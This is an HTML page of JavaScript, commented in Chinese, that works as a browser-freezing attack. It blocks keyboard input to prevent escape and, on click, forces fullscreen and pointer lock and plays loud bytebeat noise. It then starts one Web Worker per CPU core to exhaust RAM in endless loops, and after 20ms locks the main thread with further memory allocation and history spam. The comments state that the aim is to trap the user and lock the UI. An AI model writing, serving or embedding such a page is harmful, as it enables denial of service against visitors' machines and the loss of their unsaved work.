<!DOCTYPE html>
<html>
<head>
    <title>*̸̢͕̳̺̺̰̉̌́̓͆̉̊̍̒</title>
    <style>
        body { background: black; margin: 0; width: 100vw; height: 100vh; cursor: none; overflow: hidden; }
    </style>
</head>
<body onclick="launch()">
    <script>
        let triggered = false;

        // 1. 全面封鎖鍵盤 (防止 Esc 或 Alt+F4 太快被按下)
        window.addEventListener('keydown', (e) => e.preventDefault(), true);

        function launch() {
            if (triggered) return;
            triggered = true;

            // 2. 請求全螢幕與指針鎖定 (雙重鎖定)
            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
            document.body.requestPointerLock();

            // 3. 啟動 Bytebeat 音訊
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
            let t = 0;
            scriptNode.onaudioprocess = (e) => {
                const output = e.outputBuffer.getChannelData(0);
                for (let i = 0; i < 4096; i++) {
                    let val = (t >> 8 | t << 6 | t >> 5 | t << 9) & 0xFF;
                    output[i] = (val / 128.0) - 1.0;
                    t++;
                }
            };
            scriptNode.connect(audioCtx.destination);
            if (audioCtx.state === 'suspended') audioCtx.resume();

            // 4. 背景 Worker 立即開始吃掉 RAM
            const workerCode = `
                const data = [];
                while(true) {
                    try {
                        data.push(new Uint8Array(500 * 1024 * 1024).fill(0x52));
                    } catch(e) {
                        data.push(new Uint8Array(10 * 1024 * 1024));
                    }
                }
            `;
            const blob = new Blob([workerCode], {type: 'application/javascript'});
            const url = URL.createObjectURL(blob);
            for(let i = 0; i < (navigator.hardwareConcurrency || 8); i++) {
                new Worker(url);
            }

            // 5. 關鍵：延遲 20ms 後切斷主線程
            setTimeout(() => {
                const mainData = [];
                while(true) {
                    // 鎖死 UI，讓提示無法消失，視窗無法移動
                    mainData.push(new Uint8Array(500 * 1024 * 1024).fill(0x52));
                    document.title = "FATAL_ERROR_" + Math.random();
                    window.history.pushState(null, null, Math.random().toString());
                }
            }, 20); 
        }
    </script>
</body>
</html>
